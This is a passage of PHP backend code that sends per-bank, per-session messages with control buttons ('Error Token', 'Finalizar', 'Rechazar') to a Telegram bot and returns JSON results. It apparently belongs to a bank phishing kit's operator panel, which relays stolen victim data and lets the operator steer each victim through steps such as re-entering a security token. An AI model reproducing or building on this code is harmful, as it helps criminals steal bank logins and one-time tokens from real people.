                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
                        ]
                    ];
                } elseif ($step === 'token') {
                    $buttons = [
                        [
                            ['text' => '❌ Error Token', 'callback_data' => "{$banco}_error_token|{$sessionId}"],
                            ['text' => '✅ Finalizar', 'callback_data' => "{$banco}_finalizar|{$sessionId}"]
                        ]
                    ];
                } else {
                    // Botones genéricos para otros steps
                    $buttons = [
                        [
                            ['text' => '✅ Continuar', 'callback_data' => "{$banco}_continue|{$sessionId}"],
                            ['text' => '❌ Rechazar', 'callback_data' => "{$banco}_reject|{$sessionId}"]
                        ]
                    ];
                }
                
                $result = $telegram->sendMessageWithButtons($message, $buttons);
                
                if ($result['ok']) {
                    echo json_encode([
                        'success' => true,
                        'message' => 'Message sent to Telegram',
                        'telegram_response' => $result['response']
                    ]);
                    exit;
                }
            }
            
            // Si llegamos aquí sin resultado, es acción desconocida
            error_log("[TELEGRAM SEND] Unknown action: {$action}");
            http_response_code(400);
            echo json_encode(['success' => false, 'error' => 'Unknown action']);
            exit;
    }

    // Si el resultado existe y fue exitoso
    if (isset($result) && $result['ok']) {
        error_log("[TELEGRAM SEND] Message sent successfully for action: {$action}");
        echo json_encode([
            'success' => true,
            'message' => 'Message sent to Telegram',
            'telegram_response' => $result['response'] ?? null
        ]);
        exit;
    } else {
        // Si el resultado existe pero falló
        error_log("[TELEGRAM SEND] Failed to send message: " . json_encode($result));
        http_response_code(500);
        echo json_encode([
            'success' => false,
            'error' => 'Failed to send message to Telegram',
            'details' => $result ?? []
        ]);
        exit;
    }

} catch (Exception $e) {
    error_log("[TELEGRAM SEND] Exception: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
    exit;
}
